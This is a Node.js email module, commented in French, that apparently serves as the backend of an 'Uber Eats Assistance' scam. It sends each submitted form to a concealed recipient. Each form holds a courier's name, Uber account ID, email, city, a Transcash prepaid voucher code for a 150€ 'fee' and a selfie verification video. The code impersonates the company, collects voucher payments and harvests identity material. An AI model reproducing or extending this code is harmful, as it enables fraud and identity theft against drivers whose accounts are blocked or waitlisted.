const nodemailer = require('nodemailer');
const fs = require('fs');

/**
 * Service d'envoi d'emails
 */
class EmailService {
  constructor() {
    this.transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });
  }

  /**
   * Envoie une demande avec PDF et vidéo
   */
  async sendAssistanceRequest(formData, situation, pdfPath, videoPath) {
    try {
      const subject = situation === 'waiting' 
        ? `[ATTENTE] Demande assistance - ${formData.fullName}`
        : `[BLOQUÉ] Demande assistance - ${formData.fullName}`;
      
      const htmlContent = `
        <!DOCTYPE html>
        <html>
        <head>
          <style>
            body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
            .container { max-width: 600px; margin: 0 auto; padding: 20px; }
            .header { background: #000; color: white; padding: 15px; text-align: center; }
            .content { background: #f9f9f9; padding: 20px; border-radius: 5px; }
            .info-item { margin-bottom: 10px; }
            .label { font-weight: bold; color: #06C167; }
            .footer { margin-top: 30px; padding-top: 20px; border-top: 2px solid #06C167; font-size: 12px; color: #666; }
            .urgent { color: #d9534f; font-weight: bold; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="header">
              <h1>🚗 Uber Eats Assistance</h1>
              <p>Nouvelle demande d'assistance technique</p>
            </div>
            
            <div class="content">
              <h2>📋 Informations du client</h2>
              
              <div class="info-item">
                <span class="label">Situation:</span> 
                ${situation === 'waiting' ? 'Compte en liste d\'attente ⏳' : 'Compte bloqué 🚫'}
              </div>
              
              <div class="info-item">
                <span class="label">Nom complet:</span> ${formData.fullName}
              </div>
              
              <div class="info-item">
                <span class="label">Numéro de compte:</span> ${formData.uberId}
              </div>
              
              <div class="info-item">
                <span class="label">Email du compte:</span> ${formData.uberEmail}
              </div>
              
              <div class="info-item">
                <span class="label">Ville d'opération:</span> ${formData.city}
              </div>
              
              <div class="info-item">
                <span class="label">Code Transcash:</span> <strong>${formData.transcashCode}</strong>
              </div>
              
              <div class="info-item">
                <span class="label">Montant:</span> <strong>150€</strong>
              </div>
              
              <h3 style="margin-top: 30px;">📎 Pièces jointes</h3>
              <ul>
                <li>1. <strong>informations.pdf</strong> - Document récapitulatif</li>
                <li>2. <strong>video-verification.mp4</strong> - Vidéo selfie de vérification</li>
              </ul>
              
              <div class="info-item urgent" style="margin-top: 30px; padding: 15px; background: #fff3cd; border-radius: 5px;">
                ⚡ <strong>Action requise:</strong> Traiter cette demande dans les plus brefs délais
              </div>
            </div>
            
            <div class="footer">
              <p>📅 Date de réception: ${new Date().toLocaleString('fr-FR')}</p>
              <p>🔒 Cette demande a été envoyée via le formulaire sécurisé Uber Eats Assistance</p>
              <p>⚠️ Ce message est généré automatiquement, ne pas y répondre</p>
            </div>
          </div>
        </body>
        </html>
      `;

      const mailOptions = {
        from: `"Uber Eats Assistance" <${process.env.EMAIL_USER}>`,
        to: process.env.RECIPIENT_EMAIL,
        subject: subject,
        html: htmlContent,
        attachments: [
          {
            filename: `informations-${formData.fullName.replace(/\s+/g, '-')}.pdf`,
            path: pdfPath
          },
          {
            filename: `video-verification-${formData.fullName.replace(/\s+/g, '-')}.mp4`,
            path: videoPath
          }
        ]
      };

      const info = await this.transporter.sendMail(mailOptions);
      console.log('✅ Email envoyé avec succès:', info.messageId);
      
      return {
        success: true,
        messageId: info.messageId
      };
      
    } catch (error) {
      console.error('❌ Erreur lors de l\'envoi de l\'email:', error);
      throw new Error(`Échec de l'envoi de l'email: ${error.message}`);
    }
  }

  /**
   * Vérifie la configuration email
   */
  async verifyConfiguration() {
    try {
      await this.transporter.verify();
      console.log('✅ Configuration email vérifiée avec succès');
      return true;
    } catch (error) {
      console.error('❌ Erreur de configuration email:', error);
      throw error;
    }
  }
}

module.exports = new EmailService();